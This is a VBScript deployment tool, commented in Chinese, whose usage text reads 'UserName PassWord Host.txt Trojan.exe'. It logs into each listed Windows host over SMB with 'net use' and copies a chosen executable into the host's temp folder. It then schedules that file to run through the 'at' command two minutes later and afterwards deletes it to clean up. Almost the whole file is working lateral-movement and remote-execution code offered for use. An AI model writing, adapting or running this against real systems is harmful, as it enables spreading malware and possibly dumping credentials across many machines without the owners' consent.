'********************************************************************************************
'版本V2.0
'1.优化时间正则
'2.使用方法 cscript IH.vbs UserName PassWord Host.txt Trojan.exe
'********************************************************************************************
'版本V1.0
'使用方法 cscript IH.vbs
'********************************************************************************************
If (LCase(Right(WScript.FullName,11))="wscript.exe") Then 
   Set objShell=WScript.CreateObject("wscript.shell")
   objShell.Run("cmd.exe /k cscript //nologo "&chr(34)&WScript.ScriptFullName&chr(34))
   WScript.Quit
End If

'--------------------------------------------------------------------------------------------
'参数修改区
Dim WS,fso,UserName,PassWord,HostFileStr,ErrorLogFileStr,HostFile,ErrorLogFile,Host
ErrorLogFileStr="ErrorLog.txt"
If WScript.Arguments.Count=4 Then
	UserName=WScript.Arguments(0)
	PassWord=WScript.Arguments(1)
	HostFileStr=FindString(WScript.Arguments(2),".+?\.txt")
	HushDumpFileStr=FindString(WScript.Arguments(3),".+?\.exe")
Else 
	Call Usage 
	WScript.Quit
End If
If UserName="" Or PassWord="" Or HostFileStr="" Or HushDumpFileStr="" Then 
	Call Usage
	WScript.Quit 
End If 
'--------------------------------------------------------------------------------------------


Set WS = WScript.CreateObject("Wscript.Shell")
Set fso = WScript.CreateObject("Scripting.Filesystemobject")
Set HostFile=fso.OpenTextFile(HostFileStr,1,True)
Do Until HostFile.AtEndOfStream
	Call main
Loop
HostFile.Close
WScript.Echo "***Task has been added, awaiting execution***"
WScript.Sleep(1000*60*3)

Set HostFile=fso.OpenTextFile(HostFileStr,1,True)
Do Until HostFile.AtEndOfStream
	Call result
Loop
HostFile.Close
WScript.Echo "****Delete the file successfully, the task is completed****"
'------------------------------------------------------------------------------------
Function main()
	Dim NowTime,RunTime
	Host=FindString(HostFile.ReadLine,"^\\\\.+?(?=\s|$)")
	If Host="" Then Exit Function 
	WScript.Echo "Connect:"&Host
	If Run_NetUse(Host,UserName,PassWord)="0" Then 
		If Run_At(Host)="0" Then 
			If Run_Copy(Host,HushDumpFileStr,Host&"\c$\windows\temp\")="0" Then 
				NowTime=Run_NetTime(Host)
				If NowTime<>"" Then 
					RunTime=TimeValue(NowTime)+TimeValue("00:02:00")
					If Run_AtR(Host,RunTime,"cmd /c "&chr(34)&"c:\windows\temp\"&HushDumpFileStr&chr(34))="0" Then 
						If Run_NetUseD(Host)="0" Then 
							WScript.Echo "OK"&vbCrLf 
						Else
							Run_Del(Host&"\c$\windows\temp\"&HushDumpFileStr)
							Run_NetUseD(Host)
							Exit Function 
						End If 
					Else
						Run_Del(Host&"\c$\windows\temp\"&HushDumpFileStr)
						Run_NetUseD(Host)
						Exit Function
					End If 
				Else
					Run_Del(Host&"\c$\windows\temp\"&HushDumpFileStr)
					Run_NetUseD(Host)
					Exit Function
				End If 
			Else
				Run_NetUseD(Host)
				Exit Function
			End If 
		Else
			Run_NetUseD(Host)
			Exit Function
		End If 
	Else
		Exit Function
	End If 
End Function 


Function result()
	Host=FindString(HostFile.ReadLine,"^\\\\.+?(?=\s|$)")
	If Host="" Then Exit Function 
	WScript.Echo "Del:"&Host	
	If Run_NetUse(Host,UserName,PassWord)="0" Then 
			Run_Del(Host&"\c$\windows\temp\"&HushDumpFileStr)
			If Run_NetUseD(Host)="0" Then WScript.Echo "Succeed"&vbCrLf 
	Else 
		Exit Function 
	End If 
End Function 






'-----------------------------------------------------------------------------------
Function Usage()
	WScript.Echo "**************************************************************************"
	WScript.Echo "Usage:cscript "&WScript.ScriptFullName&" UserName PassWord Host.txt Trojan.exe"
	WScript.Echo "**************************************************************************"
End Function 
Function Run_NetUse(Host,UserName,PassWord)
	Dim Ret
	Ret=ExeCmd("net use " & Host &" "&Chr(34)&PassWord&chr(34) &" /user:" & UserName)
	If FindString(Ret,"成功|successfully")<>"" Then 
		Run_NetUse="0"
	Else 
		WriteFile ErrorLogFileStr,"NetUse--->"&Ret
		WScript.Echo Ret
		Run_NetUse=Ret 
	End If
End Function

Function Run_At(Host)
	Dim Ret
	Ret=ExeCmd("at " & Host)
	If FindString(Ret,"拒绝|Access")<>"" Then 
		WriteFile ErrorLogFileStr,"at--->"&Ret
		WScript.Echo Ret
		Run_At=Ret 
	Else 
		Run_At="0"
	End If
End Function

Function Run_Copy(Host,SouFile,DesFile)
	Dim Ret
	Ret=ExeCmd("copy /y "&SouFile&" "&DesFile)
	If FindString(Ret,"(已复制         1 个文件)|(1 file\(s\) copied)")<>"" Then 
		Run_Copy="0"
	Else 
		WriteFile ErrorLogFileStr,Ret
		WScript.Echo Ret
		Run_Copy=Ret 
	End If
End Function

Function Run_NetTime(Host)
	Dim Ret,Ret2
	Ret=ExeCmd("net time "&Host)
	Ret2=RPCFindString(Ret,Host&".+?(\d{1,2}\:\d{1,2}\:\d{1,2})")
	If Ret2<>"" Then 
		Run_NetTime=Ret2 
	Else 
		WriteFile ErrorLogFileStr,Ret
		WScript.Echo Ret
		Run_NetTime=Ret 
	End If
End Function

Function Run_AtR(Host,TimeStr,CmdStr)
	Dim Ret
	Ret=ExeCmd("at "&Host&" "&TimeStr&" "&CmdStr)
	If FindString(Ret,"新加了一项作业|Added a new job")<>"" Then 
		Run_AtR="0"
	Else 
		WriteFile ErrorLogFileStr,Ret
		WScript.Echo Ret
		Run_AtR=Ret 
	End If
End Function

Function Run_NetUseD(Host)
	Dim Ret
	Ret=ExeCmd("net use " & Host &" /d")
	If FindString(Ret,"已经删除|deleted successfully")<>"" Then 
		Run_NetUseD="0"
	Else 
		WriteFile ErrorLogFileStr,Ret
		WScript.Echo Ret
		Run_NetUseD=Ret 
	End If
End Function

Function Run_Type(Host,PathStr)
	Dim Ret
	Ret=ExeCmd("type " & PathStr & " > "&Right(Host,Len(Host)-2)&".txt")
	If FindString(Ret,"错误|Error")="" Then 
		Run_Type="0"
	Else 
		WriteFile ErrorLogFileStr,Ret
		WScript.Echo Ret
		Run_Type=Ret 
	End If
End Function

Function Run_Del(FileStr)
	Dim Ret
	Ret=ExeCmd("del "&FileStr)
	If FindString(Ret,"错误|Error")="" Then 
		Run_Del="0"
	Else 
		WriteFile ErrorLogFileStr,Ret
		WScript.Echo Ret
		Run_Del=Ret 
	End If
End Function
'------------------------------------------------------------------------------------
Function ExeCmd(CmdStr)
	Set CMD=WS.Exec("%comspec%")
	cmd.StdIn.WriteLine CmdStr
	cmd.StdIn.Close
	ExeCmd=cmd.StdOut.ReadAll
	Set CMD=Nothing
End Function 

Function WriteFile(FileStr,DataStr)
	Set File=fso.OpenTextFile(FileStr,8,True)
	File.WriteLine DataStr
	File.Close
End Function 


'-----------------------------------------------------------------------------
'将sSource用sPartn匹配，返回匹配出的值，每个一行
Function FindString(sSource,sPartn)
	Dim RegEx,Match,Matches,ret
	Set RegEx=New RegExp
	RegEx.MultiLine = True
	RegEx.Pattern = sPartn
	RegEx.IgnoreCase=1
	RegEx.Global=1
	Set Matches=RegEx.Execute(sSource)
	For Each Match In Matches 
		ret = ret & Match.Value 
	Next
	FindString = ret
End Function


Function AllFindString(sSource,sPartn)
	Dim RegEx,Match,Matches,SubMatch,ret,ret2
	Set RegEx=New RegExp
	RegEx.MultiLine = True
	RegEx.Pattern = sPartn
	RegEx.IgnoreCase=1
	RegEx.Global=1
	Set Matches=RegEx.Execute(sSource)
	For Each Match In Matches 
		ret=ret&Match.Value&vbTab
		For Each SubMatch In Match.Submatches
			ret2=ret2&SubMatch&vbTab 
		Next 
	Next	
	AllFindString = ret&vbCrLf&ret2
End Function 


'-----------------------------------------------------------------------------
'将sSource用sPartn匹配，返回匹配出的值，每个一行
Function RPCFindString(sSource,sPartn)
	Dim RegEx,Match,Matches,SubMatch,ret,ret2
	Set RegEx=New RegExp
	RegEx.MultiLine = True
	RegEx.Pattern = sPartn
	RegEx.IgnoreCase=1
	RegEx.Global=1
	Set Matches=RegEx.Execute(sSource)
	For Each Match In Matches 
		ret=ret&Match.submatches(0)&vbCrLf 
	Next
	RPCFindString=ret	
End Function
